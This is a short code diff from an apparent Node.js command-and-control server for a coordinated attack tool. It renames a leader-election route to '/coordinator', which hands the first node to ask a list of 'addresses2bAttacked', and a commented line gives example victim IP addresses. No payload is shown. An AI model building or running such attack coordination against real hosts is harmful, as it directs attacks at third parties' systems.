@@ -81,16 +81,16 @@ app.post("/attacker", function(req, res) {
 	console.log(attackersData);
 });
 
-app.post("/leader", function(req, res) {
+app.post("/coordinator", function(req, res) {
 	if (leader === "") {
 		leader = req.body.leader;
 		console.log("The leader is: " + leader);
-		//Send array of victims
+		//Send array of victims 
 		//res.send(["134.123.123.12:454", "5.5.5.5:564"]);
 		console.log(addresses2bAttacked);
 		res.send(addresses2bAttacked);
 	} else {
-		res.send("LEADER");
+		res.sendStatus(200);
 	}
 });
 
